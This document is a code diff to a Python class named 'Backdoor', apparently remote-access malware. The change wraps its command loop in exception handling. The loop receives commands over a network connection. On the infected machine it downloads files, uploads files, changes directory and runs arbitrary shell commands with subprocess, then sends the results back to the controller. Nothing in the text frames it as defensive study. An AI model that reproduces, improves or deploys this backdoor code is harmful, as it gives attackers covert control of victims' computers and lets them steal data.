@@ -41,6 +41,10 @@ class Backdoor:
             return "[+] Upload successful. . ."
 
     def execute_sys_command(self, command):
+        # try:
+        #     return subprocess.check_output(command, shell=True)
+        # except subprocess.CalledProcessError:
+        #     return "error during command execution"
         return subprocess.check_output(command, shell=True)
 
     def run(self):
@@ -48,26 +52,29 @@ class Backdoor:
             # command = self.connection.recv(2048).decode()
             command = self.receive_json()
 
-            #exit program
-            if(command[0].lower() == "exit"):
-                self.connection.close()
-                exit()
+            try:
+                #exit program
+                if(command[0].lower() == "exit"):
+                    self.connection.close()
+                    exit()
 
-            #change directory
-            elif(command[0] == "cd" and (len(command) > 1) ):
-                command_result = self.change_directory(command[1])
+                #change directory
+                elif(command[0] == "cd" and (len(command) > 1) ):
+                    command_result = self.change_directory(command[1])
 
-            #download file
-        elif(command[0].lower() == "download"):
-                command_result = self.read_file(command[1])
+                #download file
+                elif(command[0].lower() == "download"):
+                    command_result = self.read_file(command[1])
 
-            #upload file
-            if(command[0].lower() == "upload"):
-                command_result = self.write_file(command[1], command[2] )
+                #upload file
+                elif(command[0].lower() == "upload"):
+                    command_result = self.write_file(command[1], command[2] )
 
-            else:
-                command_result = self.execute_sys_command(command)
-                # self.connection.send(command_result)
+                else:
+                    command_result = self.execute_sys_command(command)
+                    # self.connection.send(command_result)
+            except Exception:
+                command_result = "[-] Error during command execution. "
 
             self.send_json(command_result)
 
